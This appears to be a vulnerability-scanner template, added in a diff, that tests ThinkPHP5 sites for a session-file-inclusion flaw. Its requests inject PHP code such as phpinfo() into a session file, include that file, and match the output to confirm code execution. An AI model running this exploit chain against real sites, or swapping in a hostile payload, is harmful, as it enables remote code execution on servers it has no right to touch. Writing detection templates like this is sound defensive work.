@@ -1,0 +1,124 @@
+id: thinkphp5-phpsessid-fileinclude
+
+info:
+  name: thinkphp5-phpsessid-fileinclude
+  author: venom
+  severity: critical
+  description: thinkphp5-phpsessid-fileinclude
+  tags: thinkphp
+
+variables:
+  random_uuid1: "{{rand_base(32, 'abcdefghijklmnopqrstuvwxyz0123456789')}}"    # 移除长度参数
+  random_uuid2: "{{randstr}}"
+  random_number: "{{randint(10000,99999)}}"
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/?s=0"
+      - "{{BaseURL}}/?s=%20"
+      - "{{BaseURL}}/?s=%5c"
+      - "{{BaseURL}}/?s=about"
+      - "{{BaseURL}}/?s=addlog"
+      - "{{BaseURL}}/?s=admin"
+      - "{{BaseURL}}/?s=api"
+      - "{{BaseURL}}/?s=calculation"
+      - "{{BaseURL}}/?s=captcha"
+      - "{{BaseURL}}/?s=circle"
+      - "{{BaseURL}}/?s=home"
+      - "{{BaseURL}}/?s=index"
+      - "{{BaseURL}}/?s=notify"
+      - "{{BaseURL}}/?s=www"
+      - "{{BaseURL}}/?s=wxnotify"
+
+    headers: 
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: PHPSESSID={{random_uuid1}}
+
+    body:
+      _method=__construct&filter[]=think\Session::set&method=GET&get[]=<?={{random_number}};?>
+    
+  - method: POST
+    path:
+      - "{{BaseURL}}/?s=0"
+      - "{{BaseURL}}/?s=%20"
+      - "{{BaseURL}}/?s=%5c"
+      - "{{BaseURL}}/?s=about"
+      - "{{BaseURL}}/?s=addlog"
+      - "{{BaseURL}}/?s=admin"
+      - "{{BaseURL}}/?s=api"
+      - "{{BaseURL}}/?s=calculation"
+      - "{{BaseURL}}/?s=captcha"
+      - "{{BaseURL}}/?s=circle"
+      - "{{BaseURL}}/?s=home"
+      - "{{BaseURL}}/?s=index"
+      - "{{BaseURL}}/?s=notify"
+      - "{{BaseURL}}/?s=www"
+      - "{{BaseURL}}/?s=wxnotify"
+
+    headers: 
+        Content-Type: application/x-www-form-urlencoded
+
+    body:
+      "_method=__construct&filter[]=think\\__include_file&method=GET&get[]=/tmp/sess_{{random_uuid1}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "{{random_number}}")'
+  
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/?s=0"
+      - "{{BaseURL}}/?s=%20"
+      - "{{BaseURL}}/?s=%5c"
+      - "{{BaseURL}}/?s=about"
+      - "{{BaseURL}}/?s=addlog"
+      - "{{BaseURL}}/?s=admin"
+      - "{{BaseURL}}/?s=api"
+      - "{{BaseURL}}/?s=calculation"
+      - "{{BaseURL}}/?s=captcha"
+      - "{{BaseURL}}/?s=circle"
+      - "{{BaseURL}}/?s=home"
+      - "{{BaseURL}}/?s=index"
+      - "{{BaseURL}}/?s=notify"
+      - "{{BaseURL}}/?s=www"
+      - "{{BaseURL}}/?s=wxnotify"
+
+    headers: 
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: PHPSESSID={{random_uuid2}}
+
+    body:
+      _method=__construct&filter[]=think\Session::set&method=GET&get[]=<?=phpinfo()?>
+    
+  - method: POST
+    path:
+      - "{{BaseURL}}/?s=0"
+      - "{{BaseURL}}/?s=%20"
+      - "{{BaseURL}}/?s=%5c"
+      - "{{BaseURL}}/?s=about"
+      - "{{BaseURL}}/?s=addlog"
+      - "{{BaseURL}}/?s=admin"
+      - "{{BaseURL}}/?s=api"
+      - "{{BaseURL}}/?s=calculation"
+      - "{{BaseURL}}/?s=captcha"
+      - "{{BaseURL}}/?s=circle"
+      - "{{BaseURL}}/?s=home"
+      - "{{BaseURL}}/?s=index"
+      - "{{BaseURL}}/?s=notify"
+      - "{{BaseURL}}/?s=www"
+      - "{{BaseURL}}/?s=wxnotify"
+
+    headers: 
+        Content-Type: application/x-www-form-urlencoded
+
+    body:
+      _method=__construct&filter[]=think\__include_file&method=GET&get[]=/tmp/sess_{{random_uuid2}}
+    
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "PHP Core") || contains(body, "PHP Variables")||contains(body, "PHP License")'
